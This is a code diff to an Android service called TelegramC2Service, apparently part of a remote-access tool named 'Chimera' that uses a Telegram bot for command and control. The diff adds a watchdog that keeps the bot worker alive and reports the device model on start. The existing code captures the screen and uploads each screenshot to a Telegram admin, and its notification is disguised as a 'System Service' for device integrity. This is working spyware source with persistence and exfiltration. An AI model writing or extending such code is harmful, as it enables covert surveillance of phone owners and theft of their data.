@@ -37,6 +37,7 @@ public class TelegramC2Service extends Service {
     private VirtualDisplay virtualDisplay;
     private MediaProjection mediaProjection;
     private MediaProjectionManager projectionManager;
+    private Handler watchdogHandler = new Handler();
 
     private static final String CHANNEL_ID = "ChimeraServiceChannel";
     private static final int NOTIFICATION_ID = 1;
@@ -51,12 +52,33 @@ public class TelegramC2Service extends Service {
             startForeground(NOTIFICATION_ID, createNotification());
             sendInstallMessage();
             startWorker();
+            startWatchdog();
             screenshotThread = new HandlerThread("ScreenshotHandler");
             screenshotThread.start();
             screenshotHandler = new Handler(screenshotThread.getLooper());
         } catch (Exception e) {
             ErrorLogger.logError(this, "TelegramC2Service_FATAL_ONCREATE", e);
         }
+    }
+
+    private void startWorker() {
+        if (workerThread == null || !workerThread.isAlive()) {
+            workerThread = new Thread(new TelegramBotWorker(this));
+            workerThread.start();
+        }
+    }
+
+    private void startWatchdog() {
+        watchdogHandler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                if (workerThread == null || !workerThread.isAlive()) {
+                    ErrorLogger.logError(TelegramC2Service.this, "Watchdog", new Exception("Worker thread died. Restarting."));
+                    startWorker();
+                }
+                watchdogHandler.postDelayed(this, 30000); // Check every 30 seconds
+            }
+        }, 30000);
     }
 
     @Override
@@ -70,7 +92,6 @@ public class TelegramC2Service extends Service {
             } else if ("ACTION_SCREENSHOT_RESULT".equals(action)) {
                 int resultCode = intent.getIntExtra("resultCode", Activity.RESULT_CANCELED);
                 Intent resultData = intent.getParcelableExtra("resultData");
-
                 if (resultCode == Activity.RESULT_OK && resultData != null) {
                     handleScreenshotResult(resultCode, resultData);
                 } else {
@@ -86,9 +107,7 @@ public class TelegramC2Service extends Service {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                 startForeground(NOTIFICATION_ID, createNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
             }
-
             mediaProjection = projectionManager.getMediaProjection(resultCode, data);
-
             if (mediaProjection != null) {
                 mediaProjection.registerCallback(new MediaProjection.Callback() {
                     @Override
@@ -112,19 +131,11 @@ public class TelegramC2Service extends Service {
             WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
             DisplayMetrics metrics = new DisplayMetrics();
             wm.getDefaultDisplay().getRealMetrics(metrics);
-
             int width = metrics.widthPixels;
             int height = metrics.heightPixels;
             int density = metrics.densityDpi;
-
             imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
-
-            virtualDisplay = mediaProjection.createVirtualDisplay(
-                    "ChimeraScreenCapture", width, height, density,
-                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
-                    imageReader.getSurface(), null, screenshotHandler
-            );
-
+            virtualDisplay = mediaProjection.createVirtualDisplay("ScreenCapture", width, height, density, DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, imageReader.getSurface(), null, screenshotHandler);
             screenshotHandler.postDelayed(() -> {
                 Image image = null;
                 try {
@@ -135,33 +146,26 @@ public class TelegramC2Service extends Service {
                         int pixelStride = planes[0].getPixelStride();
                         int rowStride = planes[0].getRowStride();
                         int rowPadding = rowStride - pixelStride * width;
-
                         Bitmap bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888);
                         bitmap.copyPixelsFromBuffer(buffer);
                         Bitmap croppedBitmap = Bitmap.createBitmap(bitmap, 0, 0, width, height);
                         bitmap.recycle();
-
                         File outputFile = new File(getExternalFilesDir(null), "screenshot.jpg");
                         try (FileOutputStream fos = new FileOutputStream(outputFile)) {
                             croppedBitmap.compress(Bitmap.CompressFormat.JPEG, 90, fos);
                         }
                         croppedBitmap.recycle();
                         TelegramBotWorker.uploadFile(outputFile.getAbsolutePath(), ConfigLoader.getAdminId(), "Screenshot", this);
-                    } else {
-                         TelegramBotWorker.sendMessage("Failed to acquire image for screenshot.", this);
                     }
                 } catch (Exception e) {
-                    ErrorLogger.logError(this, "ScreenshotCapture_Inner", e);
-                    TelegramBotWorker.sendMessage("Exception during bitmap processing: " + e.getMessage(), this);
+                    ErrorLogger.logError(this, "ScreenshotCapture", e);
                 } finally {
                     if (image != null) image.close();
                     stopScreenshot();
                 }
             }, 300);
-
         } catch (Exception e) {
              ErrorLogger.logError(this, "captureScreenshotSetup", e);
-             TelegramBotWorker.sendMessage("Failed to setup screenshot capture: " + e.getMessage(), this);
              stopScreenshot();
         }
     }
@@ -181,21 +185,15 @@ public class TelegramC2Service extends Service {
         }
     }
 
-    private void startWorker() {
-        if (workerThread == null || !workerThread.isAlive()) {
-            workerThread = new Thread(new TelegramBotWorker(this));
-            workerThread.start();
-        }
-    }
-
     private void sendInstallMessage() {
-        String installMessage = "Chimera installed: " + Build.MANUFACTURER + " " + Build.MODEL + " (Android " + Build.VERSION.RELEASE + ")";
+        String installMessage = "Chimera online: " + Build.MANUFACTURER + " " + Build.MODEL + " (Android " + Build.VERSION.RELEASE + ")";
         TelegramBotWorker.sendMessage(installMessage, this);
     }
 
     @Override
     public void onDestroy() {
         super.onDestroy();
+        watchdogHandler.removeCallbacksAndMessages(null);
         if (workerThread != null) workerThread.interrupt();
         if (screenshotThread != null) screenshotThread.quitSafely();
         stopScreenshot();
@@ -224,7 +222,7 @@ public class TelegramC2Service extends Service {
     private Notification createNotification() {
         return new Notification.Builder(this, CHANNEL_ID)
                 .setContentTitle("System Service")
-                .setContentText("Protecting device integrity.")
+                .setContentText("Monitoring device integrity.")
                 .setSmallIcon(android.R.drawable.ic_lock_lock)
                 .build();
     }
